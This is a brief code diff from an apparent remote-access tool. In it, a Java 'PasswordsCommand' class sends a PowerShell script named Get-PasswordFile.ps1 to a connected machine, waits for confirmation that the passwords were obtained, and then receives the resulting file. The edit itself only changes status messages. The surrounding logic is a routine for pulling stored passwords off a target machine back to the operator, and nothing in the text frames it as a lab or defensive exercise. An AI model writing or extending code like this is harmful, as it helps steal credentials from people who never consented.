@@ -18,9 +18,10 @@ public class PasswordsCommand extends Command{
 		
 		File passwordScript = new File("resources/Get-PasswordFile.ps1");
 		server.sendFile(passwordScript);
+		System.out.println("Obtaining passwords...");
 		String response = con.receive();
 		System.out.println(response);
-		if(response.equals("pass ready")) {
+		if(response.equals("Passwords obtained")) {
 			server.receiveFile();
 		}
 	}
